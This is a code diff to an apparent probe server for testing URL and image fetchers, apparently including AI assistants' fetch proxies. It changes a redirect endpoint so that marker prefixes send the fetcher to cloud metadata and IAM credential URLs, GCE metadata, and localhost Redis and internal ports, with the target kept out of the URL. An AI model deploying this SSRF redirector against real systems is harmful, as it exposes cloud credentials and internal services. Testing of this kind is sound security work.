@@ -15,8 +15,9 @@ Cases:
   /probe/q/{marker}            — valid GIF, captures query params as data
   /probe/p/{data}              — valid GIF, captures path segment as data
   /probe/r/{marker}            — 302 redirect to /probe/gif/{marker}-redirected
-  /probe/rt/{marker}       — 302 redirect to arbitrary target (?to=...),
-                                  defaults to cloud metadata (169.254.169.254)
+  /probe/rt/{marker}       — 302 redirect to server-side target based on
+                                  marker prefix (meta, metaiam, gce, redis,
+                                  internal, self)
   /probe/404/{marker}          — HTTP 404 with tiny GIF body
   /probe/slow/{delay_ms}/{marker} — valid GIF after delay
   /probe/logs                  — view logs (JSON or HTML)
@@ -278,15 +279,50 @@ async def probe_redirect(marker: str, request: Request):
     )
 
 
+# Server-side redirect targets — the fetching client never sees these in the URL.
+# Marker prefix (e.g. "meta" from "meta-check-001.gif") selects the target.
+_RT_TARGETS: Dict[str, str] = {
+    "meta": "http://169.254.169.254/latest/meta-data/",
+    "metaiam": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "gce": "http://metadata.google.internal/computeMetadata/v1/",
+    "redis": "http://localhost:6379/",
+    "internal": "http://localhost:8080/",
+    "self": "SELF",  # special: redirects back to /probe/gif/{marker}-followed
+}
+
+
+def _resolve_rt_target(marker: str) -> Optional[str]:
+    """Extract the prefix from a marker and look up the redirect target.
+
+    'meta-check-001.gif' → prefix 'meta' → http://169.254.169.254/...
+    'self-control.gif'   → prefix 'self' → /probe/gif/self-control-followed
+    """
+    base = marker.split(".", 1)[0] if "." in marker else marker
+    prefix = base.split("-", 1)[0] if "-" in base else base
+
+    target = _RT_TARGETS.get(prefix)
+    if target is None:
+        return None
+    if target == "SELF":
+        return f"/probe/gif/{base}-followed"
+    return target
+
+
 @router.get("/rt/{marker}")
 async def probe_rt_redirect(marker: str, request: Request):
-    """Case: Redirect-to. Sends the fetching proxy to an arbitrary target.
+    """Case: Redirect-to. Marker prefix determines the server-side target.
 
-    The AI sees a benign URL on this domain. The redirect sends the fetching
-    proxy to a destination it could not reach from outside (private network
-    addresses, internal services).
+    The fetching client sees a normal image URL on this domain.
+    The server looks up the redirect destination based on the marker
+    prefix and 302s the fetcher there. No target is exposed in the URL.
     """
-    target = request.query_params.get("to", "http://169.254.169.254/latest/meta-data/")
+    target = _resolve_rt_target(marker)
+
+    if target is None:
+        # Unknown prefix — serve a GIF directly (no redirect)
+        _log_request(request, "rt", marker, extra={"note": "no matching target prefix"})
+        return Response(content=_TRANSPARENT_GIF, media_type="image/gif", headers=_NO_CACHE_HEADERS)
+
     _log_request(request, "rt", marker, extra={
         "redirect_to": target,
         "note": f"redirect-to chain: proxy followed to {target}",
